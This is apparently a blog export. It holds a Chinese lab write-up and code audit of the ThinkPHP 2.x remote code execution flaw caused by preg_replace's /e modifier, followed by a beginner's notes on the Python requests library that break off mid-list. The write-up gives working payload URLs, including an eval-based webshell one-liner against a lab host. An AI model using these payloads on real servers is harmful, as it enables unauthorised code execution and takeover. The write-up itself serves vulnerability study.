~/thinkphp5\n\n\n\n1.2-rce为什么网上的复现博客都是给一个payload就结束了，难道不需要代码审计的吗，我现在连框架都审不明白。\n但是我看这个源代码更加奇怪了，之前审ThinkPHP框架的时候都是通过Application目录中控制器来解析路由的，但是这个代码没有Application目录，问了两个ai后发现GPT还是赢了，DS根本没想到2.1版本的ThinkPHP根本没有Application目录。\n而ThinkPHP2.x中的控制器实际上放在\nLib/Action/\n\n目录下\n而是通过自定义的方式决定一些目录的，index.php中写到\n&lt;?php// 定义ThinkPHP框架路径define(&#x27;THINK_PATH&#x27;, &#x27;ThinkPHP&#x27;);//定义项目名称和路径define(&#x27;APP_NAME&#x27;, &#x27;Hello&#x27;);define(&#x27;APP_PATH&#x27;, &#x27;.&#x27;);// 加载框架公共入口文件require(THINK_PATH.&quot;/ThinkPHP.php&quot;);//实例化一个网站应用实例App::run();?&gt;\n\n也就是说这个index.php中定义了网站的静态目录以及文件加载目录和项目名称等，然后还有就是App::run()这个特殊代码，以前都没见过\nApp::run()这个代码是ThinkPHP这个框架的起点，这个框架就是通过调用\nThinkPHP/Lib/Core/App.class.php\n\n中的App类的run()方法加载整个ThinkPHP框架的，主要行为就是特殊解析URL然后初始化控制器加载控制器文件，实例化控制器对象等，也就是说ThinkPHP框架能做到的特殊操作都是以这个run方法为起点加载的\n然后我们先来看第一个漏洞\nhttp://192.168.152.181:8080/?s=/Index/index/L/$&#123;@phpinfo()&#125;\n\n看见这个传入的s，我还以为这是一个类似文件包含漏洞。结果这是一个ThinkPHP特殊URL解析方式\n在 ThinkPHP 2.x 里，s 参数并不是一个普通的 GET 参数，而是框架为了 兼容模式（URL_MODEL&#x3D;3） 定义的 路由入口。不同的模式解析方式也不同\nindex.php?s=/模块/方法/参数/值\n\n也就是说这个URL实际上调用的是\n控制器中IndexAction.class.php中的index，至于为什么会多一个Action，这个是TP在寻找模块的时候会自己加上去的\n我们根据报错可以得知漏洞触发点在Dispatcher.class.php\nFatal error: preg_replace(): Failed evaluating code: $var[&#x27;fuck&#x27;]=&amp;quot;$&#123;phpinfo()&amp;quot;; in /var/www/html/ThinkPHP/Lib/Think/Util/Dispatcher.class.php on line 102\n\n这个估计是专门用来处理一些必备信息的一个类，我们找到其中用来处理路由的类\n    static public function routerCheck() &#123;        $regx = trim($_SERVER[&#x27;PATH_INFO&#x27;],&#x27;/&#x27;);//这个trim是为了将开头结尾的空白字符和/删除        if(empty($regx)) return true;        // 是否开启路由使用        if(!C(&#x27;URL_ROUTER_ON&#x27;)) return false;        // 路由定义文件优先于config中的配置定义        $routes = C(&#x27;URL_ROUTE_RULES&#x27;);        if(is_array(C(&#x27;_routes_&#x27;)))            $routes = C(&#x27;_routes_&#x27;);        // 路由处理        if(!empty($routes))        &#123;            $depr = C(&#x27;URL_PATHINFO_DEPR&#x27;);            foreach ($routes as $key=&gt;$route)&#123;                if(0 === stripos($regx.$depr,$route[0].$depr)) &#123;                    // 简单路由定义：array(&#x27;路由定义&#x27;,&#x27;分组/模块/操作名&#x27;, &#x27;路由对应变量&#x27;,&#x27;额外参数&#x27;),                    $var  =  self::parseUrl($route[1]);                    //  获取当前路由参数对应的变量                    $paths = explode($depr,trim(str_ireplace($route[0].$depr,$depr,$regx),$depr));                    $vars    =   explode(&#x27;,&#x27;,$route[2]);                    for($i=0;$i&lt;count($vars);$i++)                        $var[$vars[$i]]     =   array_shift($paths);                    // 解析剩余的URL参数                    $res = preg_replace(&#x27;@(\\w+)\\/([^,\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, implode(&#x27;/&#x27;,$paths));                    $_GET   =  array_merge($var,$_GET);                    if(isset($route[3])) &#123;                        parse_str($route[3],$params);                        $_GET   =   array_merge($_GET,$params);                    &#125;                    return true;                &#125;elseif(1 &lt; substr_count($route[0],&#x27;/&#x27;) &amp;&amp; preg_match($route[0],$regx,$matches)) &#123;                    // 路由定义规则：array(&#x27;正则定义&#x27;,&#x27;分组/模块/操作名&#x27;, &#x27;路由对应变量&#x27;,&#x27;额外参数&#x27;),                    $var  =  self::parseUrl($route[1]);                    //  获取当前路由参数对应的变量                    $vars    =   explode(&#x27;,&#x27;,$route[2]);                    for($i=0;$i&lt;count($vars);$i++)                        $var[$vars[$i]]     =   $matches[$i+1];                    // 解析剩余的URL参数                    $res = preg_replace(&#x27;@(\\w+)\\/([^,\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, str_replace($matches[0],&#x27;&#x27;,$regx));                    $_GET   =  array_merge($var,$_GET);                    if(isset($route[3])) &#123;                        parse_str($route[3],$params);                        $_GET   =   array_merge($_GET,$params);                    &#125;                    return true;                &#125;            &#125;        &#125;        return false;    &#125;\n\n这个就是对于路由的一系列特殊操作，主要是解析模板和方法，但是到最后，我们的参数则通过这个正则表达式进行解析\n$res = preg_replace(&#x27;@(\\w+)\\/([^,\\/]+)@e&#x27;, &#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;, implode(&#x27;/&#x27;,$paths));\n\n这里有一个之前没见过的@，这个是正则表达式的边界符，在这个表达式中是为了防止和/混淆，于是传入我们的payload/L/$&#123;@phpinfo()&#125;则会匹配L$&#123;@phpinfo()&#125;\n正则 @(\\w+)\\/([^,\\/]+)@e\n\n捕获组 1：\\w+ → 相当于参数名捕获L\n捕获组 2：[^,\\/]+ → 相当于参数值捕获$&#123;@phpinfo()&#125;\n末尾的 e 修饰符 表示：把替换结果当成 PHP 代码执行 ❌\n\n本来是没问题的，但是由于值使用的是双引号包裹，PHP中双引号会进行变量解析，于是就成了$var[&#39;L&#39;]=&quot;$&#123;@phpinfo()&#125;&quot;\n然后就是$&#123;&#125;这种PHP中特殊的变量，当进行解析的时候会将其内容作为PHP表达式进行解析，解析时遇到php代码则会直接执行\n\n\n我们也可以通过这个方法进行wehshell\nhttp://192.168.152.181:8080/?s=/Index/index/fuck/$&#123;@eval($_POST[cmd])&#125;\n\n这个也是可以用蚁剑连接，我们也可以选择输出执行结果在前面加一个输出函数\nhttp://192.168.152.181:8080/?s=/Index/index/fuck/$&#123;@print(eval($_POST[cmd]))&#125;\n\n\n\n\n\n\n\n\n\n\n\n\n\n这后面是错误示例，一开始没有判断对漏洞点，然后按照一步一步的去把TP2.x的模板渲染流程给看完了，TP2.x和3.x使用的都是TP自带的代码引擎，我真的佩服我自己花了好几个小时在这看模板渲染，明明都快可以进行SSTI了，后面才发现根本没有注入点，一开始的这个hello变量根本就不能覆盖妈的SBGPT\n&lt;?phpclass IndexAction extends Action&#123;    public function index() &#123;        $this-&gt;assign(&#x27;hello&#x27;,&#x27;Hello,ThinkPHP&#x27;);        $this-&gt;display();    &#125;&#125;?&gt;\n\n既然这个继承于Action类，我们就去找到Action.class.php中的display()方法\nprotected function display($templateFile=&#x27;&#x27;,$charset=&#x27;&#x27;,$contentType=&#x27;text/html&#x27;)&#123;    if(false === $templateFile) &#123;        $this-&gt;showTrace();    &#125;else&#123;        $this-&gt;view-&gt;display($templateFile,$charset,$contentType);    &#125;&#125;\n\n这个方法获取了三个参数，主要是对于templateFile参数的判断，如果没传入则触发当前类的showTrace方法，如果有则进行模板渲染。但是我看了一下漏洞的触发链中templateFile参数实际上是存在的，但是我们调用display方法的时候是没传入参数的。这个时候又涉及到了TP框架的路由解析\n$templateFile 本质上是告诉框架 要渲染哪个模板文件。 比如：\n$this-&gt;display(&#x27;User:login&#x27;); \n\n会去找 ./Tpl/User/login.html 作为模板文件。\n如果 $templateFile=&#39;&#39;，框架会根据 当前的模块名 + 方法名 自动推导，例如：\n\n访问 /Index/index\n默认模板路径就是：./Tpl/Index/index.html\n\n也就说只要我们的路由写了框架就会自动的解析出渲染文件，至于验证应该是后面的那个fetch方法进行\n我们再顺着链子去找view.calss.php中的display方法\npublic function display($templateFile=&#x27;&#x27;,$charset=&#x27;&#x27;,$contentType=&#x27;&#x27;)&#123;    $this-&gt;fetch($templateFile,$charset,$contentType,true);&#125;\n\n发现其调用了fetch方法\n    public function fetch($templateFile=&#x27;&#x27;,$charset=&#x27;&#x27;,$contentType=&#x27;&#x27;,$display=false)    &#123;        G(&#x27;_viewStartTime&#x27;);        // 使用null参数作为模版名直接返回不做任何输出        if(null===$templateFile) return;        // 网页字符编码        if(empty($charset))  $charset = C(&#x27;DEFAULT_CHARSET&#x27;);        if(empty($contentType)) $contentType = C(&#x27;TMPL_CONTENT_TYPE&#x27;);        header(&quot;Content-Type:&quot;.$contentType.&quot;; charset=&quot;.$charset);        header(&quot;Cache-control: private&quot;);  //支持页面回跳        header(&quot;X-Powered-By:ThinkPHP&quot;.THINK_VERSION);        //页面缓存        ob_start();        ob_implicit_flush(0);        // 自动定位模板文件        if(!file_exists_case($templateFile))            $templateFile   = $this-&gt;parseTemplateFile($templateFile);//我们之前是没有templateFile参数就会通过路由自动推导，现在是传入参数不存在会通过路由自动推导        $engine  = strtolower(C(&#x27;TMPL_ENGINE_TYPE&#x27;));//确认模板引擎        if(&#x27;php&#x27;==$engine) &#123;//如果是php文件直接进行包含            // 模板阵列变量分解成为独立变量            extract($this-&gt;tVar, EXTR_OVERWRITE);            // 直接载入PHP模板            include $templateFile;        &#125;elseif(&#x27;think&#x27;==$engine &amp;&amp; $this-&gt;checkCache($templateFile)) &#123;//如果是 Think 模板引擎 并且缓存文件存在，直接载入缓存过的模板（已经编译过）。            // 如果是Think模板引擎并且缓存有效 分解变量并载入模板缓存            extract($this-&gt;tVar, EXTR_OVERWRITE);            //载入模版缓存文件            include C(&#x27;CACHE_PATH&#x27;).md5($templateFile).C(&#x27;TMPL_CACHFILE_SUFFIX&#x27;);        &#125;else&#123;//也就是说我们的模板文件没有编译过也不是php则会调用模板引擎类（如 TemplateThink）来解析模板文件。            // 模板文件需要重新编译 支持第三方模板引擎            // 调用模板引擎解析和输出            $className   = &#x27;Template&#x27;.ucwords($engine);            require_cache(THINK_PATH.&#x27;/Lib/Think/Util/Template/&#x27;.$className.&#x27;.class.php&#x27;);//加载我们的TemplateThink.class.php 但是只会加载一次            $tpl   =  new $className;            $tpl-&gt;fetch($templateFile,$this-&gt;tVar,$charset);//调用TemplateThink.class.php中的fetch方法        &#125;        $this-&gt;templateFile   =  $templateFile;        // 获取并清空缓存        $content = ob_get_clean();        // 模板内容替换        $content = $this-&gt;templateContentReplace($content);        // 布局模板解析        $content = $this-&gt;layout($content,$charset,$contentType);        // 输出模板文件        return $this-&gt;output($content,$display);    &#125;\n\n这个方法我感觉是整个路由中模板渲染的核心，按照这个渲染流程来看每一个进行模板渲染的方法似乎都需要通过这个fetch方法\n我们路由中渲染的模板需要经过编译，加载了TemplateThink.class.php之中的fetch方法，我们来看下\npublic function fetch($templateFile,$var,$charset) &#123;    if(!$this-&gt;checkCache($templateFile)) &#123;        // 缓存无效 重新编译        $tpl = Think::instance(&#x27;ThinkTemplate&#x27;);        // 编译并加载模板文件        $tpl-&gt;load($templateFile,$var,$charset);    &#125;else&#123;        // 缓存有效 直接载入模板缓存        // 模板阵列变量分解成为独立变量        extract($var, EXTR_OVERWRITE);        //载入模版缓存文件        include C(&#x27;CACHE_PATH&#x27;).md5($templateFile).C(&#x27;TMPL_CACHFILE_SUFFIX&#x27;);    &#125;&#125;\n\n如果缓存无效则加载ThinkTemplate.clss.php文件然后调用load方法\n我们再找来load方法\n    public function load($templateFile,$templateVar,$charset) &#123;        $this-&gt;tVar = $templateVar;        $templateCacheFile  =  $this-&gt;loadTemplate($templateFile);//这里调用的loadTemplate方法        // 模板阵列变量分解成为独立变量        extract($templateVar, EXTR_OVERWRITE);        //载入模版缓存文件        include $templateCacheFile;    &#125;\n\n寻找loadTemplate方法\n    public function loadTemplate ($tmplTemplateFile=&#x27;&#x27;)    &#123;        if(empty($tmplTemplateFile))    $tmplTemplateFile = $this-&gt;config[&#x27;default_tmpl&#x27;];        if(!is_file($tmplTemplateFile))&#123;            $tmplTemplateFile =  dirname($this-&gt;config[&#x27;default_tmpl&#x27;]).&#x27;/&#x27;.$tmplTemplateFile.$this-&gt;config[&#x27;template_suffix&#x27;];            if(!is_file($tmplTemplateFile))                throw_exception(L(&#x27;_TEMPLATE_NOT_EXIST_&#x27;).&#x27;:&#x27;.$tmplTemplateFile);        &#125;        $this-&gt;templateFile    =  $tmplTemplateFile;        //根据模版文件名定位缓存文件        $tmplCacheFile = $this-&gt;config[&#x27;cache_path&#x27;].md5($tmplTemplateFile).$this-&gt;config[&#x27;cache_suffix&#x27;];        $tmplContent = &#x27;&#x27;;        // 检查Cache文件是否需要更新        if (!$this-&gt;checkCache($tmplTemplateFile)) &#123;            // 需要更新模版 读出原模板内容            $tmplContent = file_get_contents($tmplTemplateFile);            //编译模板内容            $tmplContent = $this-&gt;compiler($tmplContent);//读出模板内容后对其进行编译，调用compiler方法            // 检测分组目录            if(!is_dir($this-&gt;config[&#x27;cache_path&#x27;]))                mk_dir($this-&gt;config[&#x27;cache_path&#x27;]);            //重写Cache文件            if( false === file_put_contents($tmplCacheFile,trim($tmplContent)))                throw_exception(L(&#x27;_CACHE_WRITE_ERROR_&#x27;).&#x27;:&#x27;.$tmplCacheFile);        &#125;        return $tmplCacheFile;    &#125;\n\n真的好麻烦，但是找都找了，就找完，就当练代码审计了\nprotected function compiler( $tmplContent)&#123;    //模板解析    $tmplContent = $this-&gt;parse($tmplContent);    if(ini_get(&#x27;short_open_tag&#x27;))        // 开启短标签的情况要将&lt;?标签用echo方式输出 否则无法正常输出xml标识        $tmplContent = preg_replace(&#x27;/(&lt;\\?(?!php|=|$))/i&#x27;, &#x27;&lt;?php echo \\&#x27;\\\\1\\&#x27;; ?&gt;&#x27;.&quot;\\n&quot;, $tmplContent );    // 还原被替换的Literal标签    $tmplContent = preg_replace(&#x27;/&lt;!--###literal(\\d)###--&gt;/eis&#x27;,&quot;\\$this-&gt;restoreLiteral(&#x27;\\\\1&#x27;)&quot;,$tmplContent);    // 添加安全代码    $tmplContent  =  &#x27;&lt;?php if (!defined(\\&#x27;THINK_PATH\\&#x27;)) exit();?&gt;&#x27;.$tmplContent;    if(C(&#x27;TMPL_STRIP_SPACE&#x27;)) &#123;        /* 去除html空格与换行 */        $find     = array(&quot;~&gt;\\s+&lt;~&quot;,&quot;~&gt;(\\s+\\n|\\r)~&quot;);        $replace  = array(&quot;&gt;&lt;&quot;,&quot;&gt;&quot;);        $tmplContent = preg_replace($find, $replace, $tmplContent);    &#125;    return trim($tmplContent);&#125;\n\n终于看到了漏洞点了，这个调用了parse方法用来解析我们模板渲染文件的内容，不管后面的那些替换操作，我们直接来看parse方法\n    public function parse($content)    &#123;        $begin = $this-&gt;config[&#x27;taglib_begin&#x27;];        $end   = $this-&gt;config[&#x27;taglib_end&#x27;];        // 首先替换literal标签内容        $content = preg_replace(&#x27;/&#x27;.$begin.&#x27;literal&#x27;.$end.&#x27;(.*?)&#x27;.$begin.&#x27;\\/literal&#x27;.$end.&#x27;/eis&#x27;,&quot;\\$this-&gt;parseLiteral(&#x27;\\\\1&#x27;)&quot;,$content);//这里虽然有/e 但是这里不是漏洞的触发点0        // 获取需要引入的标签库列表        // 标签库只需要定义一次，允许引入多个一次        // 一般放在文件的最前面        // 格式：&lt;taglib name=&quot;html,mytag...&quot; /&gt;        // 当TAGLIB_LOAD配置为true时才会进行检测        if(C(&#x27;TAGLIB_LOAD&#x27;)) &#123;            $this-&gt;getIncludeTagLib($content);            if(!empty($this-&gt;tagLib)) &#123;                // 对导入的TagLib进行解析                $_taglibs = C(&#x27;_taglibs_&#x27;);                foreach($this-&gt;tagLib as $tagLibName) &#123;                    // 内置标签库                    $tagLibName   = strtolower($tagLibName);                    if(!import(&#x27;Think.Template.TagLib.TagLib&#x27;.ucwords($tagLibName))) &#123;                        // 扩展标签库                        if($_taglibs &amp;&amp; isset($_taglibs[$tagLibName]))                            // &#x27;tagLibName&#x27;=&gt;&#x27;importPath&#x27;                            import($_taglibs[$tagLibName]);                        else                            throw_exception($tagLibName.L(&#x27;_TAGLIB_NOT_EXIST_&#x27;));                    &#125;                    $this-&gt;parseTagLib($tagLibName,$content);                &#125;            &#125;        &#125;        // 预先加载的标签库 无需在每个模板中使用taglib标签加载        if(C(&#x27;TAGLIB_PRE_LOAD&#x27;)) &#123;            $tagLibs =  explode(&#x27;,&#x27;,C(&#x27;TAGLIB_PRE_LOAD&#x27;));            foreach ($tagLibs as $tag)&#123;                $this-&gt;parseTagLib($tag,$content);            &#125;        &#125;        // 内置标签库 无需使用taglib标签导入就可以使用        $tagLibs =  explode(&#x27;,&#x27;,C(&#x27;TAGLIB_BUILD_IN&#x27;));        foreach ($tagLibs as $tag)&#123;            $this-&gt;parseTagLib($tag,$content,true);        &#125;        //解析普通模板标签 &#123;tagName:&#125;        $content = preg_replace(&#x27;/(&#x27;.$this-&gt;config[&#x27;tmpl_begin&#x27;].&#x27;)(\\S.+?)(&#x27;.$this-&gt;config[&#x27;tmpl_end&#x27;].&#x27;)/eis&#x27;,&quot;\\$this-&gt;parseTag(&#x27;\\\\2&#x27;)&quot;,$content);//漏洞触发的正则表达式        return $content;    &#125;\n\n我们可以看到解析普通模板标签的在正则表达式的最后有/eis，我们将变量转化为对应的符号后看到正则表达式\n/(\\&#123;)(\\S.+?)(\\&#125;)/eis&#123;$&#123;@phpinfo()&#125;&#125;  //匹配字符串  也就是需要匹配被&#123;&#125;包裹的字符串，但由于只有三个捕获组于是中间的&#123;&#125;就不会被匹配\n\n会匹配到所有被&#123;&#125;包裹的内容，但是我们还得看下/e这个以前没见过的元字符是什么意思\n在 PHP 的正则表达式中，/e 修饰符（也称为 “eval” 修饰符）曾经是一个特殊的功能，但从 PHP 5.5.0 开始已被弃用，并在 PHP 7.0.0 中完全移除。\n当使用 preg_replace() 函数时，/e 修饰符会使替换字符串 $replacement 被当作 PHP 代码来执行，执行结果再用于替换匹配的部分。\n$string = &quot;Today is &#123;time&#125;&quot;;$result = preg_replace(&#x27;/\\&#123;time\\&#125;/e&#x27;, &#x27;date(&quot;Y-m-d&quot;)&#x27;, $string);// 会输出类似: Today is 2023-05-15\n\n也就是说/e这个元字符会让第二个参数作为php代码被执行，然后替换掉被匹配到的部分\n于是我们又需要来看一下replactment\n\\$this-&gt;parseTag(&#x27;\\\\2&#x27;)\n\n这个最重要的就是\\2\n在 PHP 的 preg_replace() 或类似正则替换函数中，\\2 是一个反向引用（backreference），它引用正则表达式中第 2 个捕获组（capturing group）匹配到的内容。正则表达式中用 () 括起来的部分会形成捕获组\n我们来看匹配到的三个捕获组为\n第 1 个捕获组 &#x3D; &#123;\n第 2 个捕获组 &#x3D; $&#123;@phpinfo()&#125;\n第 3 个捕获组 &#x3D; &#125;\n也就是说，最后执行的代码为\n$this-&gt;parseTag(&#x27;@$phpinfo()&#x27;)\n\n\n\n但是现在又有一个问题就是，原来渲染的index.html，中是这样的\n &lt;tr&gt;&lt;td&gt;&lt;div class=&quot;result&quot;&gt;&#123;$hello&#125;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n\n这个时候就得重新回到index类中\nclass IndexAction extends Action&#123;    public function index() &#123;        $this-&gt;assign(&#x27;hello&#x27;,&#x27;Hello,ThinkPHP&#x27;);        $this-&gt;display();    &#125;&#125;\n\n然后在模板 index.html 中，&#123;$hello&#125; 就会被替换成 Hello,ThinkPHP。 也就是说，**assign() 就是把控制器里的数据传给模板**。但是当我知道php中没有assign这个函数的时候我就知道事情不简单\n在经过一番寻找后我找到了assign方法，在view类中\npublic function assign($name,$value=&#x27;&#x27;)&#123;    if(is_array($name)) &#123;        $this-&gt;tVar   =  array_merge($this-&gt;tVar,$name);    &#125;elseif(is_object($name))&#123;        foreach($name as $key =&gt;$val)            $this-&gt;tVar[$key] = $val;    &#125;else &#123;        $this-&gt;tVar[$name] = $value;//php中字符串不属于对象，直接放入tVar数组中    &#125;&#125;\n\n我到这里才发现，我根本没有办法去覆盖hello变量，这个一开始就是通过assign赋值死了，我用SSTI注入的角度来看TP的模板渲染，结果发现有漏洞，也是由/e引起的，后面进行模板渲染的时候我们直接写如php代码即可进行模板注入，但是这个代码根本没有给我注入点，虽然SSTI这个思路失败了，但是好歹进行了代码审计，搞不好以后会有题目考到这个，最后在放下TP模板渲染的代码吧\n也算是知道TP的模板注入是什么模式了。\n    public function parseVar($varStr)&#123;        $varStr = trim($varStr);        static $_varParseList = array();        //如果已经解析过该变量字串，则直接返回变量值        if(isset($_varParseList[$varStr])) return $_varParseList[$varStr];        $parseStr =&#x27;&#x27;;        $varExists = true;        if(!empty($varStr))&#123;            $varArray = explode(&#x27;|&#x27;,$varStr);            //取得变量名称            $var = array_shift($varArray);            //非法变量过滤 不允许在变量里面使用 -&gt;            //TODO：还需要继续完善            if(preg_match(&#x27;/-&gt;/is&#x27;,$var))                return &#x27;&#x27;;            if(&#x27;Think.&#x27; == substr($var,0,6))&#123;                // 所有以Think.打头的以特殊变量对待 无需模板赋值就可以输出                $name = $this-&gt;parseThinkVar($var);            &#125;            elseif( false !== strpos($var,&#x27;.&#x27;)) &#123;                //支持 &#123;$var.property&#125;                $vars = explode(&#x27;.&#x27;,$var);                $var  =  array_shift($vars);                switch(strtolower(C(&#x27;TMPL_VAR_IDENTIFY&#x27;))) &#123;                    case &#x27;array&#x27;: // 识别为数组                        $name = &#x27;$&#x27;.$var;                        foreach ($vars as $key=&gt;$val)                            $name .= &#x27;[&quot;&#x27;.$val.&#x27;&quot;]&#x27;;                        break;                    case &#x27;obj&#x27;:  // 识别为对象                        $name = &#x27;$&#x27;.$var;                        foreach ($vars as $key=&gt;$val)                            $name .= &#x27;-&gt;&#x27;.$val;                        break;                    default:  // 自动判断数组或对象 只支持二维                        $name = &#x27;is_array($&#x27;.$var.&#x27;)?$&#x27;.$var.&#x27;[&quot;&#x27;.$vars[0].&#x27;&quot;]:$&#x27;.$var.&#x27;-&gt;&#x27;.$vars[0];                &#125;            &#125;            elseif(false !==strpos($var,&#x27;::&#x27;))&#123;                //支持 &#123;$var:property&#125; 方式输出对象的属性                $vars = explode(&#x27;::&#x27;,$var);                $var  =  str_replace(&#x27;::&#x27;,&#x27;-&gt;&#x27;,$var);                $name = &quot;$&quot;.$var;                $var  = $vars[0];            &#125;            elseif(false !== strpos($var,&#x27;[&#x27;)) &#123;                //支持 &#123;$var[&#x27;key&#x27;]&#125; 方式输出数组                $name = &quot;$&quot;.$var;                preg_match(&#x27;/(.+?)\\[(.+?)\\]/is&#x27;,$var,$match);                $var = $match[1];            &#125;            else &#123;                $name = &quot;$$var&quot;;            &#125;            //对变量使用函数            if(count($varArray)&gt;0)                $name = $this-&gt;parseVarFunction($name,$varArray);            $parseStr = &#x27;&lt;?php echo (&#x27;.$name.&#x27;); ?&gt;&#x27;;//这里会直接拼接然后输入，就不知道能不能绕过前面的正则过滤        &#125;        $_varParseList[$varStr] = $parseStr;        return $parseStr;//直接返回php代码输出到index.html中    &#125;\n\n\n\n"},{"title":"requests库","url":"/2025/03/06/requests%E5%BA%93/","content":"requests库笔记前言唉，ctfshow上面sql注入和sqli-lab难度跨越有点大，反正我感觉有点难了，但php特性和反序列化也在继续。突然想起python和requests库还没学，还被要求写盲注脚本，试一试也没有问题\n1.基本用法#导入requests库import requests#发送一个get请求并得到响应r = requests.get(&#x27;https://www.baidu.com&#x27;)#查看响应对象的类型print(type(r))#查看响应状态码print(r.status_code)#查看响应内容的类型print(type(r.text))#查看响应的内容print(r.text)#查看cookiesprint(r.cookies)\n\n还有很多响应对象的其他属性，但是太多了，等到遇到的时候再去学吧\n 这里调用了get( )方法实现urlopen( )相同的操作，结果返回一个响应对象，然后分别输出响应对象类型、状态码、响应体内容的类型、 响应体的内容、Cookies。通过运行结果可以得知：响应对象的类型是requests.models.Response，响应体内容的类型是str，Cookies 的类型是RequestCookieJar。如果要发送其他类型的请求直接调用其对应的方法即可\nurllib.request.urlopen() 是 Python 中用于发送 HTTP&#x2F;HTTPS 请求的核心函数，属于 urllib.request 模块。\n使用POST方法\nr = requests.post(&#x27;https://www.baidu.com&#x27;)r = requests.put(&#x27;https://www.baidu.com&#x27;)r = requests.delete(&#x27;https://www.baidu.com&#x27;)r = requests.head(&#x27;https://www.baidu.com&#x27;)r = requests.options(&#x27;https://www.baidu.com&#x27;)\n\n1.GET请求构建一个GET请求，请求http://httpbin.org/get（该网站会判断如果客户端发起的是GET请求的话，它返回相应的信息）\nimport requestsr = requests.get(&#x27;http://httpbin.org/get&#x27;)print(r.text)\n\n这是GET响应\n\n\n添加参数\n如果要添加请求参数，比如添加两个请求参数，其中name值是germey，age值是20。虽然可以写成如下形式\nr = requests.get(&#x27;http://httpbin.org/get?name=germey&amp;age=20&#x27;)\n\n但较好的写法是下面这种写法：\nimport requestsdata = &#123;\t&#x27;name&#x27;:&#x27;germey&#x27;,  &#x27;age&#x27;:22&#125;#python里面的字典，主要特征为可以储存任意类型的对象，感觉和php里面的类和C语言里的结构体相似r = requests.get(&#x27;http://httpbin.org/get&#x27;,params=data)print(r.text)\n\n\n\n通过运行结果可以看出，请求的URL最终被构造成了“http://httpbin.org/get?name=germey&amp;age=20”。\njson转字典\n网页的返回内容的类型是str类型的，如果它符合JSON格式，则可以使用json( )方法将其转换为字典类型，以方便解析\nimport requestsr = requests.get(&#x27;http://httpbin.org/get&#x27;)#str类型print(type(r.text))#返回响应内容的字典形式print(r.json())#dict类型print(type(r.json()))\n\n 但需要注意，如果返回的内容不是JSON格式，调用json( )方法便会出现错误，抛出json.decoder.JSONDecodeError\n字典形式\n&#123;&#x27;args&#x27;: &#123;&#125;, &#x27;headers&#x27;: &#123;&#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Host&#x27;: &#x27;httpbin.org&#x27;, &#x27;User-Agent&#x27;: &#x27;python-requests/2.32.3&#x27;, &#x27;X-Amzn-Trace-Id&#x27;: &#x27;Root=1-67c9955f-68776b290ad160a3602176fb&#x27;&#125;, &#x27;origin&#x27;: &#x27;116.162.93.208&#x27;, &#x27;url&#x27;: &#x27;http://httpbin.org/get&#x27;&#125;\n\n2.POST请求发送请求和参数和GET差不多，但响应内容不一样,POST参数是form表单\nimport requestsdata = &#123;  &quot;name&quot;:&quot;germey&quot;,  &quot;age&quot;:&quot;22&quot;&#125;r = requests.post(&#x27;http://httpbin.org/post&#x27;,data=data)print(r.text)\n\n\n\n2.设置请求头之前也接触过请求头，但都是用bp抓了然后再去改请求头\n下面是一个实例\nimport requestsheaders = &#123;  &#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0&#x27;,  &#x27;my-test&#x27;:&#x27;Hello&#x27;&#125;r = requests.get(&#x27;http://httpbin.org/get&#x27;,headers=headers)print(r.text)\n\n我们之前的User-Agent都是python，自己定义就可以伪造请求头\n\n\n3.响应属性\n发送请求后，返回一个响应，它具有很多属性，通过它的属性来获取状态码、响应头、Cookies、响应内容等。如下：\nimport requestsr = requests.get(&#x27;https://www.baidu.com/&#x27;)#响应内容（str类型）print(type(r.text),r.text)#响应内容（bytes类型）print(type(r.content),r.content)#状态码print(type(r.status_code),r.status_code)#响应头print(type(r.headers),r.headers)#Cookiesprint(type(r.cookies),r.cookies)#URLprint(type(r.url),r.url)#请求历史print(type(r.history),r.history)\n\n状态码\n状态码常用来判断请求是否成功，除了可以使用HTTP提供的状态码，requests库中也提供了一个内置的状态码查询对象，叫做 requests.codes，实际上两者都是等价的。示例如下：\nimport requestsr = requests.get(&#x27;https://www.baidu.com/&#x27;)if not r.status_code==requests.codes.ok:  print(&#x27;Request Fail&#x27;)else:  print(&#x27;Request Successfully&#x27;)\n\n我们可以通过状态码判断请求是否成功\n requests.codes对象拥有的状态码如下：\n#信息性状态码100：(&#x27;continue&#x27;,),101：(&#x27;switching_protocols&#x27;,),102：(&#x27;processing&#x27;,),103：(&#x27;checkpoint&#x27;,),122：(&#x27;uri_too_long&#x27;,&#x27;request_uri_too_long&#x27;),#成功状态码200：(&#x27;ok&#x27;,&#x27;okay&#x27;,&#x27;all_ok&#x27;,&#x27;all_okay&#x27;,&#x27;all_good&#x27;,&#x27;\\\\o/&#x27;,&#x27;√&#x27;),201：(&#x27;created&#x27;,),202：(&#x27;accepted&#x27;,),203：(&#x27;non_authoritative_info&#x27;,&#x27;non_authoritative_information&#x27;),204：(&#x27;no_content&#x27;,),205：(&#x27;reset_content&#x27;,&#x27;reset&#x27;),206：(&#x27;partial_content&#x27;,&#x27;partial&#x27;),207：(&#x27;multi_status&#x27;,&#x27;multiple_status&#x27;,&#x27;multi_stati&#x27;,&#x27;multiple_stati&#x27;),208：(&#x27;already_reported&#x27;,),226：(&#x27;im_used&#x27;,),#重定向状态码300：(&#x27;multiple_choices&#x27;,),301：(&#x27;moved_permanently&#x27;,&#x27;moved&#x27;,&#x27;\\\\o-&#x27;),302：(&#x27;found&#x27;,),303：(&#x27;see_other&#x27;,&#x27;other&#x27;),304：(&#x27;not_modified&#x27;,),305：(&#x27;user_proxy&#x27;,),306：(&#x27;switch_proxy&#x27;,),307：(&#x27;temporary_redirect&#x27;,&#x27;temporary_moved&#x27;,&#x27;temporary&#x27;),308：(&#x27;permanent_redirect&#x27;,),#客户端请求错误400：(&#x27;bad_request&#x27;,&#x27;bad&#x27;),401：(&#x27;unauthorized&#x27;,),402：(&#x27;payment_required&#x27;,&#x27;payment&#x27;),403：(&#x27;forbiddent&#x27;,),404：(&#x27;not_found&#x27;,&#x27;-o-&#x27;),405：(&#x27;method_not_allowed&#x27;,&#x27;not_allowed&#x27;),406：(&#x27;not_acceptable&#